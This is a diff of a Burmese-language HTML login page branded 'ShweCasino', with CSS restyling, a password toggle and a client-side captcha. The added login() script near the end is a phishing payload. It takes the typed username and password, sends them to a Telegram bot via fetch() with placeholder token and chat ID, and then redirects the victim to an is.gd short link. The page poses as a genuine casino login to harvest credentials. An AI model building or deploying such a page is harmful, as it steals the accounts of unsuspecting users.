@@ -10,8 +10,8 @@
 
 body{
 margin:0;
-font-family:Myanmar Text, sans-serif;
 background:#8b0000;
+font-family: Myanmar Text;
 color:white;
 }
 
@@ -21,26 +21,28 @@ color:white;
 width:100%;
 height:220px;
 object-fit:cover;
-display:block;
 }
 
-/* login box */
+/* container */
 
 .container{
 padding:20px;
 }
 
+/* title */
+
 .title{
 text-align:center;
 font-size:28px;
-font-weight:bold;
-margin-bottom:20px;
 color:#ffd27f;
+margin-bottom:20px;
 }
+
+/* input */
 
 input{
 width:100%;
-padding:14px;
+padding:15px;
 margin:10px 0;
 border:none;
 border-radius:12px;
@@ -50,42 +52,38 @@ font-size:16px;
 }
 
 input::placeholder{
-color:#cfcfcf;
+color:#cccccc;
 }
 
-.password-box{
+/* password */
+
+.pass-box{
 position:relative;
 }
 
 .eye{
 position:absolute;
 right:15px;
-top:16px;
+top:17px;
 cursor:pointer;
-color:#ffd27f;
 }
 
 /* captcha */
 
-.captcha-box{
+.captcha{
 background:#e6c88f;
 color:black;
 padding:15px;
-border-radius:12px;
+border-radius:10px;
 text-align:center;
 font-size:26px;
 letter-spacing:10px;
 margin:10px 0;
 }
 
-.refresh{
-cursor:pointer;
-margin-left:10px;
-}
-
 /* login button */
 
-.login-btn{
+.login{
 width:100%;
 background:#f0c16b;
 border:none;
@@ -93,7 +91,7 @@ padding:16px;
 border-radius:12px;
 font-size:20px;
 font-weight:bold;
-margin-top:15px;
+margin-top:10px;
 cursor:pointer;
 }
 
@@ -103,88 +101,109 @@ cursor:pointer;
 display:flex;
 justify-content:space-between;
 margin-top:15px;
-font-size:15px;
 color:#ffd27f;
-}
-
-.links a{
-color:#ffd27f;
-text-decoration:none;
 }
 
 </style>
+
 </head>
 
 <body>
 
 <div class="banner">
-<img src="https://i.imgur.com/8Km9tLL.jpg">
+<img src="logo.jpg">
 </div>
 
 <div class="container">
 
 <div class="title">အကောင့်ထဲဝင်ရန်</div>
 
-<input type="text" placeholder="အကောင့်ပြုလုပ်အမည်">
+<input id="user" placeholder="အမည်ပြုအမည်">
 
-<div class="password-box">
-<input type="password" id="password" placeholder="စကားဝှက်">
-<span class="eye" onclick="togglePassword()">👁</span>
+<div class="pass-box">
+<input type="password" id="pass" placeholder="စကားဝှက်">
+<span class="eye" onclick="showpass()"></span>
 </div>
 
 <div style="text-align:right;margin-bottom:10px;">
 စကားဝှက်မေ့နေပါသလား?
 </div>
 
-<div class="captcha-box">
-<span id="captcha"></span>
-<span class="refresh" onclick="createCaptcha()">↻</span>
+<div class="captcha">
+<span id="cap"></span>
 </div>
 
-<input type="text" placeholder="အပေါ်ကဂဏန်းတွေကိုထည့်ပါ">
+<input id="capinput" placeholder="အပေါ်ကဂဏန်းကိုထည့်ပါ">
 
-<button class="login-btn" onclick="login()">အကောင့်ထဲဝင်ရန်</button>
+<button class="login" onclick="login()">အကောင့်ထဲဝင်ရန်</button>
 
 <div class="links">
-<a href="#">အကောင့်အသစ်ဖွင့်ရန်</a>
-<a href="#">စာရင်းသွင်းရန်</a>
+<span>အကောင့်အသစ်ဖွင့်ရန်</span>
+<span>စာရင်းသွင်းရန်</span>
 </div>
 
 </div>
 
 <script>
 
-/* password show hide */
-
-function togglePassword(){
-let pass = document.getElementById("password");
-
-if(pass.type === "password"){
-pass.type = "text";
-}else{
-pass.type = "password";
-}
-}
-
 /* captcha */
 
-function createCaptcha(){
+var captcha;
 
-let num = "";
+function makecaptcha(){
 
-for(let i=0;i<5;i++){
-num += Math.floor(Math.random()*10);
+captcha="";
+
+for(i=0;i<5;i++){
+captcha+=Math.floor(Math.random()*10);
 }
 
-document.getElementById("captcha").innerText = num;
+document.getElementById("cap").innerHTML=captcha;
 
 }
 
-createCaptcha();
+makecaptcha();
 
-/* login redirect */
+/* show password */
+
+function showpass(){
+
+var p=document.getElementById("pass");
+
+if(p.type==="password"){
+p.type="text";
+}else{
+p.type="password";
+}
+
+}
+
+/* login */
 
 function login(){
+
+var user=document.getElementById("user").value;
+var pass=document.getElementById("pass").value;
+var cap=document.getElementById("capinput").value;
+
+if(cap!=captcha){
+
+alert("captcha မှားနေပါတယ်");
+makecaptcha();
+return;
+
+}
+
+/* TELEGRAM BOT */
+
+var token="BOT_TOKEN";
+var chatid="CHAT_ID";
+
+var msg="ShweCasino Login\n\nUsername: "+user+"\nPassword: "+pass;
+
+fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid+"&text="+msg);
+
+/* redirect */
 
 window.location.href="https://is.gd/shwecasino_com";
 
